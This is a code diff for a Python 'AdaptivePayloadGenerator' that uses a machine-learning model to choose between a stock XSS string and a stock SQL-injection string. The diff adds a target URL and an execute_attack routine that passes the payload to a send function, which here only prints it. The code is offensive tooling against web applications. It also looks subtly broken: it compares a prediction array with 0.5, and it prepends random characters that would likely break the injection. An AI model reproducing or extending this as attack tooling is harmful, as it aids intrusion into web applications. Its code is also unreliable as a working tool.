@@ -1,27 +1,53 @@
 import random
 import string
-from sklearn.externals import joblib
+import numpy as np
+import tensorflow as tf
 
 class AdaptivePayloadGenerator:
-    def __init__(self, model_path):
-        self.model = joblib.load(model_path)
+    def __init__(self, model_path, target_url):
+        self.model = tf.keras.models.load_model(model_path)
+        self.target_url = target_url
 
     def generate_payload(self, input_data):
-        # Prediksi tipe serangan berdasarkan model
-        attack_type = self.model.predict([input_data])[0]
+        """
+        Generate adaptive payloads based on machine learning model
+        that predicts effective attack strategies.
+        """
+        input_vector = self.process_input_data(input_data)
+        attack_strategy = self.model.predict(np.array([input_vector]))
 
-        if attack_type == "sql_injection":
-            return self._generate_sql_injection_payload()
-        elif attack_type == "xss":
-            return self._generate_xss_payload()
+        payload = self.create_payload(attack_strategy)
+        return payload
+
+    def process_input_data(self, input_data):
+        """
+        Convert input data to a vector representation.
+        """
+        return [ord(c) for c in input_data]
+
+    def create_payload(self, attack_strategy):
+        """
+        Generate a payload based on the predicted strategy.
+        """
+        length = random.randint(10, 30)
+        characters = string.ascii_letters + string.digits + string.punctuation
+        payload = ''.join(random.choice(characters) for i in range(length))
+
+        if attack_strategy > 0.5:
+            payload += "<script>alert('XSS')</script>"
         else:
-            return self._generate_default_payload()
+            payload += "' OR 1=1 --"
 
-    def _generate_sql_injection_payload(self):
-        return "' OR 1=1 --"
+        return payload
 
-    def _generate_xss_payload(self):
-        return "<script>alert('XSS')</script>"
+    def execute_attack(self, input_data):
+        """
+        Executes an attack using the generated payload.
+        """
+        payload = self.generate_payload(input_data)
+        response = self.send_payload(payload)
+        return response
 
-    def _generate_default_payload(self):
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+    def send_payload(self, payload):
+        print(f"Sending payload: {payload} to {self.target_url}")
+        return "Payload sent!"
